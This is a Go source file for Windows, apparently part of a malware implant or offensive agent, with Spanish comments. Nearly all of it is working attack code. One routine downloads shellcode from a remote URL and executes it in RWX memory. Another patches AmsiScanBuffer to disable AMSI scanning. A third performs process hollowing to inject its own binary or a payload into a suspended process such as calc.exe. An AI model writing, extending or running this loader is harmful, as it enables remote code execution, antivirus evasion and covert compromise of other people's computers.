// loader_windows.go
//go:build windows

package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

/*
#cgo LDFLAGS: -lkernel32
#include <windows.h>
#include <string.h>

static void execute_shellcode(unsigned char* sc, unsigned int sc_len) {
    LPVOID memory = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (memory == NULL) return;

    memcpy(memory, sc, sc_len);
    ((void(*)())memory)();
}
*/
import "C"

const (
    IMAGE_DOS_SIGNATURE              = 0x5A4D
    IMAGE_NT_SIGNATURE               = 0x00004550
    IMAGE_NT_OPTIONAL_HDR32_MAGIC    = 0x10b
    IMAGE_NT_OPTIONAL_HDR64_MAGIC    = 0x20b
    IMAGE_SIZEOF_SHORT_NAME          = 8
    IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
)

type IMAGE_DOS_HEADER struct {
    Signature uint16
    _         [58]byte
    LFANew    uint32
}

type IMAGE_FILE_HEADER struct {
    Machine              uint16
    NumberOfSections     uint16
    TimeDateStamp        uint32
    PointerToSymbolTable uint32
    NumberOfSymbols      uint32
    SizeOfOptionalHeader uint16
    Characteristics      uint16
}

type IMAGE_DATA_DIRECTORY struct {
    VirtualAddress uint32
    Size           uint32
}

type IMAGE_OPTIONAL_HEADER32 struct {
    Magic                       uint16
    MajorLinkerVersion          byte
    MinorLinkerVersion          byte
    SizeOfCode                  uint32
    SizeOfInitializedData       uint32
    SizeOfUninitializedData     uint32
    AddressOfEntryPoint         uint32
    BaseOfCode                  uint32
    ImageBase                   uint32
    SectionAlignment            uint32
    FileAlignment               uint32
    MajorOperatingSystemVersion uint16
    MinorOperatingSystemVersion uint16
    MajorImageVersion           uint16
    MinorImageVersion           uint16
    MajorSubsystemVersion       uint16
    MinorSubsystemVersion       uint16
    Win32VersionValue           uint32
    SizeOfImage                 uint32
    SizeOfHeaders               uint32
    CheckSum                    uint32
    Subsystem                   uint16
    DllCharacteristics          uint16
    SizeOfStackReserve          uint32
    SizeOfStackCommit           uint32
    SizeOfHeapReserve           uint32
    SizeOfHeapCommit            uint32
    LoaderFlags                 uint32
    NumberOfRvaAndSizes         uint32
    DataDirectory               [IMAGE_NUMBEROF_DIRECTORY_ENTRIES]IMAGE_DATA_DIRECTORY
}

type IMAGE_OPTIONAL_HEADER64 struct {
    Magic                       uint16
    MajorLinkerVersion          byte
    MinorLinkerVersion          byte
    SizeOfCode                  uint32
    SizeOfInitializedData       uint32
    SizeOfUninitializedData     uint32
    AddressOfEntryPoint         uint32
    BaseOfCode                  uint32
    ImageBase                   uint64
    SectionAlignment            uint32
    FileAlignment               uint32
    MajorOperatingSystemVersion uint16
    MinorOperatingSystemVersion uint16
    MajorImageVersion           uint16
    MinorImageVersion           uint16
    MajorSubsystemVersion       uint16
    MinorSubsystemVersion       uint16
    Win32VersionValue           uint32
    SizeOfImage                 uint32
    SizeOfHeaders               uint32
    CheckSum                    uint32
    Subsystem                   uint16
    DllCharacteristics          uint16
    SizeOfStackReserve          uint64
    SizeOfStackCommit           uint64
    SizeOfHeapReserve           uint64
    SizeOfHeapCommit            uint64
    LoaderFlags                 uint32
    NumberOfRvaAndSizes         uint32
    DataDirectory               [IMAGE_NUMBEROF_DIRECTORY_ENTRIES]IMAGE_DATA_DIRECTORY
}

type IMAGE_NT_HEADERS32 struct {
    Signature      uint32
    FileHeader     IMAGE_FILE_HEADER
    OptionalHeader IMAGE_OPTIONAL_HEADER32
}

type IMAGE_NT_HEADERS64 struct {
    Signature      uint32
    FileHeader     IMAGE_FILE_HEADER
    OptionalHeader IMAGE_OPTIONAL_HEADER64
}

type IMAGE_SECTION_HEADER struct {
    Name                 [IMAGE_SIZEOF_SHORT_NAME]byte
    Misc                 uint32
    VirtualAddress       uint32
    SizeOfRawData        uint32
    PointerToRawData     uint32
    PointerToRelocations uint32
    PointerToLinenumbers uint32
    NumberOfRelocations  uint16
    NumberOfLinenumbers  uint16
    Characteristics      uint32
}

// === NTDLL SYS CALLS FOR CONTEXT MANIPULATION ===
var (
    ntdll          = syscall.NewLazyDLL("ntdll.dll")
    procGetContext = ntdll.NewProc("NtGetContextThread")
    procSetContext = ntdll.NewProc("NtSetContextThread")
    procQueryInfo  = ntdll.NewProc("NtQueryInformationProcess")
)

type CONTEXT struct {
    ContextFlags uint32
    _            [4]byte
    Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15 uint64
    EFlags                                                              uint32
    _                                                                   [4]byte
    // ... resto no necesario
}

type WOW64_CONTEXT struct {
    ContextFlags uint32
    Dr0, Dr1, Dr2, Dr3, Dr6, Dr7 uint32
    Eax, Ecx, Edx, Ebx, Esp, Ebp, Esi, Edi uint32
    EFlags uint32
}

// === NTDLL Process Information Structures ===

type PEB struct {
    InheritedAddressSpace    uint8
    ReadImageFileExecOptions uint8
    BeingDebugged            uint8
    BitField                 uint8
    _                        [4]byte
    ImageBaseAddress         uint64
    // ... resto no necesario
}

type PROCESS_BASIC_INFORMATION struct {
    Reserved1           uintptr
    PebBaseAddress      *PEB
    Reserved2           [2]uintptr
    UniqueProcessId     uintptr
    Reserved3           uintptr
}

func executeLoader(shellcodeURL string) {
	shellcode, err := readShellcodeFromURL(shellcodeURL)
	if err != nil {
		fmt.Printf("Error downloading shellcode: %v\n", err)
		return
	}

	if len(shellcode) == 0 {
		fmt.Printf("Error: No shellcode bytes found\n")
		return
	}

	fmt.Printf("Loaded %d bytes of shellcode from URL\n", len(shellcode))

	C.execute_shellcode(
		(*C.uchar)(unsafe.Pointer(&shellcode[0])),
		C.uint(len(shellcode)),
	)
}

func readShellcodeFromURL(url string) ([]byte, error) {
	client := &http.Client{
		Timeout: 15 * time.Second,
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("error creating request: %v", err)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "text/plain")
	req.Header.Set("Connection", "close")

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("error connecting: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP error: %d", resp.StatusCode)
	}

	const maxShellcodeSize = 2 << 20
	body, err := io.ReadAll(io.LimitReader(resp.Body, maxShellcodeSize))
	if err != nil {
		return nil, fmt.Errorf("error reading body: %v", err)
	}

	if len(body) == maxShellcodeSize {
		return nil, fmt.Errorf("shellcode too large")
	}

	text := string(body)
	var shellcode []byte

	for i := 0; i < len(text)-3; i++ {
		if text[i] == '\\' && text[i+1] == 'x' {
			hexStr := text[i+2 : i+4]
			if len(hexStr) == 2 {
				if b, err := strconv.ParseUint(hexStr, 16, 8); err == nil {
					shellcode = append(shellcode, byte(b))
				}
			}
			i += 3
		}
	}

	return shellcode, nil
}

func patchAMSI() error {
	// Cargar amsi.dll dinámicamente
	amsi, err := syscall.LoadLibrary("amsi.dll")
	if err != nil {
		return fmt.Errorf("failed to load amsi.dll: %v", err)
	}
	defer syscall.FreeLibrary(amsi)

	// Obtener la dirección de AmsiScanBuffer
	scanBufferAddr, err := syscall.GetProcAddress(amsi, "AmsiScanBuffer")
	if err != nil {
		return fmt.Errorf("failed to get AmsiScanBuffer address: %v", err)
	}

	// Parche: reemplazar con ret (0xc3)
	patch := []byte{0xc3}

	// Obtener el handle del proceso actual
	var hProcess windows.Handle
	hProcess, err = windows.OpenProcess(windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE, false, windows.GetCurrentProcessId())
	if err != nil {
		return fmt.Errorf("failed to open process: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	// Cambiar permisos de memoria
	var oldProtect uint32
	var size uintptr = 1
	err = windows.VirtualProtectEx(
		hProcess,
		uintptr(unsafe.Pointer(scanBufferAddr)),
		size,
		windows.PAGE_EXECUTE_READWRITE,
		&oldProtect,
	)
	if err != nil {
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	// Escribir el parche
	var bytesWritten uintptr
	err = windows.WriteProcessMemory(
		hProcess,
		uintptr(unsafe.Pointer(scanBufferAddr)),
		&patch[0],
		size,
		&bytesWritten,
	)
	if err != nil {
		return fmt.Errorf("failed to write memory: %v", err)
	}

	// Restaurar permisos originales
	err = windows.VirtualProtectEx(
		hProcess,
		uintptr(unsafe.Pointer(scanBufferAddr)),
		size,
		oldProtect,
		&oldProtect,
	)
	if err != nil {
		return fmt.Errorf("failed to restore memory protection: %v", err)
	}

	fmt.Println("[+] AMSI patched: AmsiScanBuffer replaced with ret")
	return nil
}

// === PROCESS HOLLOWING: MIGRATE SELF TO ANOTHER PROCESS ===
// Comando: migrate:C:\Windows\System32\calc.exe
func overWrite(targetPath, payloadPath string) {
    fmt.Printf("[*] Starting migration to: %s\n", targetPath)

    var exeData []byte
    var err error

    // === Si no se especifica payload, usa el proceso actual ===
    if payloadPath == "" {
        exePath, err := os.Executable()
        if err != nil {
            fmt.Printf("[-] Failed to get executable path: %v\n", err)
            return
        }

        exeData, err = os.ReadFile(exePath)
        if err != nil {
            fmt.Printf("[-] Failed to read own binary: %v\n", err)
            return
        }
        fmt.Printf("[+] Loaded self as payload (%d bytes)\n", len(exeData))
    } else {
        // === Si se especifica payload, úsalo ===
        exeData, err = os.ReadFile(payloadPath)
        if err != nil {
            fmt.Printf("[-] Failed to read payload file %s: %v\n", payloadPath, err)
            return
        }
        fmt.Printf("[+] Loaded payload from file (%d bytes)\n", len(exeData))
    }

    // === Continúa con el resto del proceso (igual que antes) ===
    payloadImage, err := peBufferToVirtualImage(exeData)
    if err != nil {
        fmt.Printf("[-] Failed to map payload to virtual image: %v\n", err)
        return
    }
    payloadImageSize := uint32(len(payloadImage))
    fmt.Printf("[+] Payload image size: %d\n", payloadImageSize)

    // === Leer el binario del target para verificar compatibilidad ===
    targetData, err := os.ReadFile(targetPath)
    if err != nil {
        fmt.Printf("[-] Failed to read target file: %v\n", err)
        return
    }

    isPayload32bit := !is64Bit(exeData)
    isTarget32bit := !is64Bit(targetData)
    targetImageSize := getImageSize(targetData)

    if isPayload32bit != isTarget32bit {
        fmt.Printf("[-] Architecture mismatch: payload is %s, target is %s\n",
            boolStr(isPayload32bit, "32-bit", "64-bit"),
            boolStr(isTarget32bit, "32-bit", "64-bit"))
        return
    }
    fmt.Printf("[+] Payload and Target architecture match (%s)\n", boolStr(isPayload32bit, "32-bit", "64-bit"))

    if payloadImageSize > targetImageSize {
        fmt.Printf("[-] Payload size (%d) exceeds target image size (%d)\n", payloadImageSize, targetImageSize)
        return
    }
    fmt.Printf("[+] Size compatible: %d <= %d\n", payloadImageSize, targetImageSize)

    // === Crear proceso suspendido ===
    var si windows.StartupInfo
    var pi windows.ProcessInformation
    si.Cb = uint32(unsafe.Sizeof(si))

    argv := windows.StringToUTF16Ptr(targetPath)
    err = windows.CreateProcess(nil, argv, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, &si, &pi)
    if err != nil {
        fmt.Printf("[-] CreateProcess failed: %v\n", err)
        return
    }
    defer windows.CloseHandle(pi.Process)
    defer windows.CloseHandle(pi.Thread)

    fmt.Printf("[+] Suspended process created. PID: %d\n", pi.ProcessId)

    // === Obtener base remota ===
    remoteBase, err := getRemoteImageBase(&pi, isPayload32bit)
    if err != nil {
        fmt.Printf("[-] Failed to get remote image base: %v\n", err)
        return
    }
    fmt.Printf("[+] Remote image base: 0x%X\n", remoteBase)

    // === Protección de memoria ===
    var oldProtect uint32
    err = windows.VirtualProtectEx(pi.Process, uintptr(remoteBase), uintptr(payloadImageSize), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
    if err != nil {
        fmt.Printf("[-] VirtualProtectEx failed: %v\n", err)
        return
    }

    // === Escribir payload ===
    var written uint32
    err = windows.WriteProcessMemory(pi.Process, uintptr(remoteBase), &payloadImage[0], uintptr(payloadImageSize), (*uintptr)(unsafe.Pointer(&written)))
    if err != nil || written != payloadImageSize {
        fmt.Printf("[-] WriteProcessMemory failed: %v, written=%d\n", err, written)
        return
    }
    fmt.Printf("[+] Successfully wrote %d bytes into remote process\n", written)

    // === Calcular nuevo Entry Point ===
    entryPointRVA := getEntryPointRVA(exeData)
    entryPointVA := remoteBase + uint64(entryPointRVA)

    // === Actualizar contexto del hilo ===
    err = updateRemoteEntryPoint(&pi, entryPointVA, isPayload32bit)
    if err != nil {
        fmt.Printf("[-] Failed to update thread context: %v\n", err)
        return
    }
    fmt.Printf("[+] Thread context updated to entry point: 0x%X\n", entryPointVA)

    // === Reanudar ===
    _, err = windows.ResumeThread(pi.Thread)
    if err != nil {
        fmt.Printf("[-] ResumeThread failed: %v\n", err)
        return
    }
    fmt.Printf("[+] Process resumed. Migration successful!\n")

}

// === PE PARSING HELPERS (copiar todo esto también) ===


func getNTHeaders(data []byte) unsafe.Pointer {
    if len(data) < int(unsafe.Sizeof(IMAGE_DOS_HEADER{})) {
        return nil
    }
    dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&data[0]))
    if dosHeader.Signature != IMAGE_DOS_SIGNATURE {
        return nil
    }
    ntHeaderOffset := dosHeader.LFANew
    if int(ntHeaderOffset)+4 >= len(data) {
        return nil
    }
    ntSig := *(*uint32)(unsafe.Pointer(&data[ntHeaderOffset]))
    if ntSig != IMAGE_NT_SIGNATURE {
        return nil
    }
    return unsafe.Pointer(&data[ntHeaderOffset])
}

func is64Bit(data []byte) bool {
    ntPtr := getNTHeaders(data)
    if ntPtr == nil {
        return false
    }
    magic := *(*uint16)(unsafe.Pointer(uintptr(ntPtr) + 24))
    return magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC
}

func getImageSize(data []byte) uint32 {
    ntPtr := getNTHeaders(data)
    if ntPtr == nil {
        return 0
    }
    if is64Bit(data) {
        return (*IMAGE_NT_HEADERS64)(ntPtr).OptionalHeader.SizeOfImage
    } else {
        return (*IMAGE_NT_HEADERS32)(ntPtr).OptionalHeader.SizeOfImage
    }
}

func getEntryPointRVA(data []byte) uint32 {
    ntPtr := getNTHeaders(data)
    if ntPtr == nil {
        return 0
    }
    if is64Bit(data) {
        return (*IMAGE_NT_HEADERS64)(ntPtr).OptionalHeader.AddressOfEntryPoint
    } else {
        return (*IMAGE_NT_HEADERS32)(ntPtr).OptionalHeader.AddressOfEntryPoint
    }
}

func peBufferToVirtualImage(rawData []byte) ([]byte, error) {
    ntPtr := getNTHeaders(rawData)
    if ntPtr == nil {
        return nil, fmt.Errorf("invalid PE headers")
    }

    var sizeOfImage, sizeOfHeaders uint32
    var numberOfSections uint16

    if is64Bit(rawData) {
        nt := (*IMAGE_NT_HEADERS64)(ntPtr)
        sizeOfImage = nt.OptionalHeader.SizeOfImage
        sizeOfHeaders = nt.OptionalHeader.SizeOfHeaders
        numberOfSections = nt.FileHeader.NumberOfSections
    } else {
        nt := (*IMAGE_NT_HEADERS32)(ntPtr)
        sizeOfImage = nt.OptionalHeader.SizeOfImage
        sizeOfHeaders = nt.OptionalHeader.SizeOfHeaders
        numberOfSections = nt.FileHeader.NumberOfSections
    }

    if sizeOfImage == 0 || sizeOfImage > 100<<20 {
        return nil, fmt.Errorf("invalid image size: %d", sizeOfImage)
    }

    image := make([]byte, sizeOfImage)
    copy(image, rawData[:sizeOfHeaders])

    sectionHeaderOffset := uintptr(ntPtr) + 24 + unsafe.Sizeof(IMAGE_FILE_HEADER{}) + unsafe.Sizeof(IMAGE_OPTIONAL_HEADER32{})
    if is64Bit(rawData) {
        sectionHeaderOffset += unsafe.Sizeof(IMAGE_OPTIONAL_HEADER64{}) - unsafe.Sizeof(IMAGE_OPTIONAL_HEADER32{})
    }

    sections := (*[100]IMAGE_SECTION_HEADER)(unsafe.Pointer(sectionHeaderOffset))

    for i := 0; i < int(numberOfSections); i++ {
        sec := &sections[i]
        if sec.PointerToRawData == 0 || sec.SizeOfRawData == 0 {
            continue
        }
        dstStart := int(sec.VirtualAddress)
        dstEnd := dstStart + int(sec.SizeOfRawData)
        srcStart := int(sec.PointerToRawData)
        srcEnd := srcStart + int(sec.SizeOfRawData)

        if dstEnd > len(image) || srcEnd > len(rawData) {
            continue
        }
        copy(image[dstStart:dstEnd], rawData[srcStart:srcEnd])
    }

    return image, nil
}

// === getRemoteImageBase: Lee la base del módulo desde el PEB (versión debug) ===
func getRemoteImageBase(pi *windows.ProcessInformation, is32bitTarget bool) (uint64, error) {
    var pebAddr uint64

    if is32bitTarget {
        var ctx WOW64_CONTEXT
        ctx.ContextFlags = 0x10007
        r1, _, err := procGetContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
        if r1 == 0 {
            pebAddr = uint64(ctx.Ebx)
            fmt.Printf("[DEBUG] WOW64: Ebx = 0x%X\n", ctx.Ebx)
        } else {
            fmt.Printf("[DEBUG] Wow64GetThreadContext failed: %v (NTSTATUS: 0x%X)\n", err, r1)
        }
    } else {
        var ctx CONTEXT
        ctx.ContextFlags = 0x100000
        r1, _, err := procGetContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
        if r1 == 0 {
            pebAddr = ctx.Rdx
            fmt.Printf("[DEBUG] x64: Rdx = 0x%X\n", ctx.Rdx)
        } else {
            fmt.Printf("[DEBUG] GetThreadContext failed: %v (NTSTATUS: 0x%X)\n", err, r1)
        }
    }

    if pebAddr != 0 {
        fmt.Printf("[DEBUG] PEB address from context: 0x%X\n", pebAddr)
        offset := uint64(0x10)
        if is32bitTarget {
            offset = 0x8
        }
        var imageBase uint64
        var n uint32
        err := windows.ReadProcessMemory(
            pi.Process,
            uintptr(pebAddr + offset),
            (*byte)(unsafe.Pointer(&imageBase)),
            uintptr(unsafe.Sizeof(imageBase)),
            (*uintptr)(unsafe.Pointer(&n)),
        )
        if err == nil && n == uint32(unsafe.Sizeof(imageBase)) && imageBase != 0 {
            fmt.Printf("[+] Got ImageBase from PEB: 0x%X\n", imageBase)
            return imageBase, nil
        }
        fmt.Printf("[DEBUG] Failed to read ImageBase from PEB: %v, n=%d, value=0x%X\n", err, n, imageBase)
    } else {
        fmt.Printf("[DEBUG] PEB address from context is 0, falling back to NtQueryInformationProcess\n")
    }

    // === Fallback: NtQueryInformationProcess ===
	var pbi PROCESS_BASIC_INFORMATION
	var retLen uint32

	fmt.Printf("[DEBUG] Calling NtQueryInformationProcess...\n")
	r1, _, err := procQueryInfo.Call(
		uintptr(pi.Process),
		0,
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if r1 != 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess failed: %v (NTSTATUS: 0x%X)", err, r1)
	}
	fmt.Printf("[DEBUG] NtQueryInformationProcess succeeded\n")

	if pbi.PebBaseAddress == nil {
		return 0, fmt.Errorf("PebBaseAddress is null")
	}
	fmt.Printf("[DEBUG] PebBaseAddress: %p\n", pbi.PebBaseAddress)

	remotePebAddr := uintptr(unsafe.Pointer(pbi.PebBaseAddress))
	remoteImageBaseAddr := remotePebAddr + 0x10 // ImageBaseAddress está en PEB + 0x10

	var imageBase uint64
	var n uint32
	err = windows.ReadProcessMemory(
		pi.Process,
		remoteImageBaseAddr,
		(*byte)(unsafe.Pointer(&imageBase)),
		uintptr(unsafe.Sizeof(imageBase)),
		(*uintptr)(unsafe.Pointer(&n)),
	)
	if err != nil || n != uint32(unsafe.Sizeof(imageBase)) {
		return 0, fmt.Errorf("failed to read ImageBaseAddress from remote PEB: %v", err)
	}
	if imageBase == 0 {
		return 0, fmt.Errorf("remote ImageBaseAddress is 0")
	}

	fmt.Printf("[+] Successfully read remote ImageBase: 0x%X\n", imageBase)
	return imageBase, nil
}

// === updateRemoteEntryPoint: Cambia EAX/RAX al nuevo Entry Point ===
func updateRemoteEntryPoint(pi *windows.ProcessInformation, entryPointVA uint64, is32bitTarget bool) error {
    if is32bitTarget {
        var ctx WOW64_CONTEXT
        ctx.ContextFlags = 0x10007

        r1, _, err := procGetContext.Call(
            uintptr(pi.Thread),
            uintptr(unsafe.Pointer(&ctx)),
        )
        if r1 != 0 {
            return fmt.Errorf("Wow64GetThreadContext failed: %v", err)
        }

        ctx.Eax = uint32(entryPointVA)

        r1, _, err = procSetContext.Call(
            uintptr(pi.Thread),
            uintptr(unsafe.Pointer(&ctx)),
        )
        if r1 != 0 {
            return fmt.Errorf("Wow64SetThreadContext failed: %v", err)
        }
    } else {
        var ctx CONTEXT
        ctx.ContextFlags = 0x100000

        r1, _, err := procGetContext.Call(
            uintptr(pi.Thread),
            uintptr(unsafe.Pointer(&ctx)),
        )
        if r1 != 0 {
            return fmt.Errorf("GetThreadContext failed: %v", err)
        }

        ctx.Rcx = entryPointVA

        r1, _, err = procSetContext.Call(
            uintptr(pi.Thread),
            uintptr(unsafe.Pointer(&ctx)),
        )
        if r1 != 0 {
            return fmt.Errorf("SetThreadContext failed: %v", err)
        }
    }

    return nil
}

func boolStr(b bool, t, f string) string {
    if b {
        return t
    }
    return f
}


